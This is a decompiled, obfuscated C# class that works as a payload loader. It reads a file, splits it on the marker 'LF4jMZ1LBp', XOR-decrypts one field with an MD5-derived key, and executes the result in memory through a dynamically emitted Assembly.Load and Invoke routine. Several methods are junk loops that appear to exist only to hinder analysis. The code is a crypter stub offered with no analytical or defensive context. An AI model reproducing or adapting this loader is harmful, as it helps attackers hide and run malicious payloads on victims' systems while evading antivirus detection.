using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns3;

namespace ns2;

internal class Class8
{
	unsafe static void smethod_0(Class7 class7_0)
	{
		void* ptr = stackalloc byte[40];
		*(int*)((byte*)ptr + 28) = 5429412;
		*(int*)((byte*)ptr + 32) = 0;
		do
		{
			*(double*)ptr = 410037.0;
			new decimal(96L);
			checked
			{
				(*unchecked((int*)((byte*)ptr + 32)))++;
			}
		}
		while (*(int*)((byte*)ptr + 32) <= 634371936);
		while (true)
		{
			*(long*)((byte*)ptr + 16) = 62L;
			*(int*)((byte*)ptr + 36) = 479978;
			*(double*)((byte*)ptr + 8) = 21941.0;
		}
	}

	static void smethod_1()
	{
		string[] array = Strings.Split(File.ReadAllText(Class9.string_0), "LF4jMZ1LBp", -1, (CompareMethod)0);
		byte[] byte_ = Class8.smethod_2(array[18], array[1]);
		Thread.Sleep(1000);
		Class8.smethod_5(byte_, "A");
	}

	unsafe static byte[] smethod_2(string string_0, string string_1)
	{
		void* ptr = stackalloc byte[12];
		StringBuilder stringBuilder = new StringBuilder();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_1));
		byte* num = (byte*)ptr + 4;
		*(int*)((byte*)ptr + 8) = checked(string_0.Length - 1);
		*(int*)num = 0;
		while (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 8))
		{
			checked
			{
				string value = Conversions.ToString(Strings.Chr((int)unchecked(Conversions.ToLong("&H" + string_0.Substring(*(int*)((byte*)ptr + 4), 2)) ^ array[*(int*)ptr])));
				stringBuilder.Append(value);
				if (*unchecked((int*)ptr) == string_1.Length - 1)
				{
					*unchecked((int*)ptr) = 0;
				}
				else
				{
					(*unchecked((int*)ptr))++;
				}
				*unchecked((int*)((byte*)ptr + 4)) += 2;
			}
		}
		return Encoding.Default.GetBytes(stringBuilder.ToString());
	}

	unsafe static object smethod_3(Class9 class9_0)
	{
		void* ptr = stackalloc byte[25];
		*(double*)((byte*)ptr + 8) = 78.0;
		((byte*)ptr)[24] = 0;
		*(long*)ptr = 4106317L;
		while (true)
		{
			decimal num = default(decimal);
			*(long*)((byte*)ptr + 16) = 8L;
		}
	}

	unsafe static void smethod_4(Class9 class9_0)
	{
		void* ptr = stackalloc byte[30];
		*(int*)((byte*)ptr + 8) = 438826;
		*(int*)((byte*)ptr + 12) = 2456788;
		((byte*)ptr)[28] = 0;
		*(int*)((byte*)ptr + 20) = 0;
		*(double*)ptr = 1.0;
		decimal num = default(decimal);
		*(int*)((byte*)ptr + 16) = 5812;
		while (true)
		{
			((byte*)ptr)[29] = 1;
			*(int*)((byte*)ptr + 24) = 89545;
		}
	}

	static object smethod_5(byte[] byte_0, string string_0)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("ExecBytes", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		}, typeof(object));
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		iLGenerator.Emit(OpCodes.Ldarg_0);
		iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		return dynamicMethod.Invoke(null, new object[4]
		{
			byte_0,
			new object[0],
			"A.A",
			string_0
		});
	}
}
